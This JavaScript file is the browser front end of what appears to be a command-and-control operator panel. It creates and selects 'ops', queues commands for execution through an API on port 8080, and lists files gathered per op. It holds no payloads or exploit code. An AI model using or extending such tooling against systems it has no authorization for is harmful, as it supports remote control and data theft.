var current_op = null;

var api_url = `${window.location.protocol}//${window.location.hostname}:8080`;

function fetch_all_ops() {
    // Fetch all known ops and put them in the select option list.
    var select_tag = document.getElementById('ops-select');
    select_tag.innerHTML = `<option value='Choose an op'>Choose an op</option>`;
    var req = new XMLHttpRequest();
    req.responseType = 'json';
    
    req.addEventListener('load', function () {
        var all_ops = this.response['data']['ops'];
        for (var i=0; i < all_ops.length; i++) {
            var new_option = document.createElement('option');
            new_option.text = all_ops[i];
            select_tag.add(new_option);
        }
    });
    req.open('GET', `${api_url}/op`);
    req.send();
}

function change_op(op_name) {
    current_op = op_name;
    console.log(`Loading new op: ${current_op}.`);
    document.getElementById('displayed-op-name').innerText = `Current op: ${current_op}`;
    display_commands();
}

function detect_op_choice() {
    var select_tag = document.getElementById('ops-select');
    select_tag.addEventListener('change', function () {
        var op_choice = select_tag.value;
        console.log(op_choice);
        if (op_choice != 'Choose an op') {
            change_op(op_choice);
        }
    });
}

function detect_new_op_click() {
    var new_tag = document.getElementById('new-nav');
    new_tag.addEventListener('click', function () {
        var new_op_name = prompt('Create a new op', '');
        if (new_op_name == null || new_op_name == '') {
            return;
        }
        
        var json_data = JSON.stringify({'op_name': new_op_name});

        var req = new XMLHttpRequest();
        req.responseType = 'json';
        
        req.addEventListener('load', function () {
            console.log(this.response);
            fetch_all_ops();
        });
        req.open('POST',`${api_url}/op/create`);
        req.send(json_data);
    });
}

function detect_create_command_click() {
    document.getElementById('command-create').addEventListener('click', function () {
        var command = document.getElementById('command-input').value;
        var confirmation = confirm(`Command to execute: ${command}`);
        if (!confirmation) {
            return;
        }
        console.log(command);
        var command_type = document.getElementById('command-type-choice').value;
        var req = new XMLHttpRequest();
        req.responseType = 'json';

        var json_data = JSON.stringify(
        {
            'cmd_type': command_type,
            'cmd_data': command,
            'op_name': current_op,

        });

        req.addEventListener('load', function () {
            fetch_latest_command();
        });
        req.open('POST', `${api_url}/post`);
        req.send(json_data);
    });
}

function fetch_latest_command() {
    if (!current_op) {
        return;
    }
    var req = new XMLHttpRequest();
    req.responseType = 'json';
    
    req.addEventListener('load', function () {
        var latest_command_guid = this.response['data']['guid'];
        console.log('Latest command: ' + latest_command_guid);
        var req2 = new XMLHttpRequest();
        req2.responseType = 'json';
        
        req2.addEventListener('load', function () {
            var latest_command_type = this.response['data']['type'];
            var latest_command_content = this.response['data']['cmd'];

            var new_command_item = document.createElement('div');
            new_command_item.innerText = `Latest Command (${latest_command_type}): ${latest_command_content}`;
            document.getElementById('command-list').innerHTML = '';
            document.getElementById('command-list').appendChild(new_command_item);
        });
        req2.open('GET', `${api_url}/cmd/${latest_command_guid}`);
        req2.send();
        
    });
    req.open('GET', `${api_url}/op/fetch/${current_op}`);
    req.send();
}

function detect_delete_op_click() {
    
}

function display_commands() {
    if (!current_op) {
        return;
    }
    console.log(`Displaying commands for op ${current_op}`);
    // Clear previous contents
    document.getElementById('command-list').innerHTML = '';

    display_specific_content('command-content');
    fetch_latest_command();
}

function display_files() {
    if (!current_op) {
        return;
    }
    console.log(`Displaying files for op ${current_op}`);
    display_specific_content('files-content');

    var files_content_div = document.getElementById('files-list');
    files_content_div.innerHTML = '';
    var req = new XMLHttpRequest();
    req.responseType = 'json';
    
    req.addEventListener('load', function () {
        var all_files = this.response['data']['files'];
        for (var i=0; i < all_files.length; i++) {
            if (all_files[i]['op_name'] == current_op) {
                var new_el = document.createElement('li');
                new_el.innerText = all_files[i]['filename'];
                files_content_div.appendChild(new_el);
            }
        }
    });
    req.open('GET', `${api_url}/files`);
    req.send();
    // TODO: fetch files for current op.
    
}

function hide_all_content() {
    return new Promise((resolve, reject) => {
        document.getElementById('command-content').style.display = 'none';
        document.getElementById('files-content').style.display = 'none';
        resolve();
    });
}

function display_specific_content(content) {
    hide_all_content()
    .then(() => {
        document.getElementById(content).style.display = 'initial';
    })
    .catch((err) => {
        console.log(err);
    });
}

function bind_command_nav() {
    document.getElementById('commands-nav').addEventListener('click', display_commands);
}

function bind_files_nav() {
    document.getElementById('files-nav').addEventListener('click', display_files);
}

function init() {
    fetch_all_ops();
    detect_op_choice();
    detect_new_op_click();
    detect_create_command_click();
    hide_all_content();
    bind_command_nav();
    bind_files_nav();
}

window.onload = init;
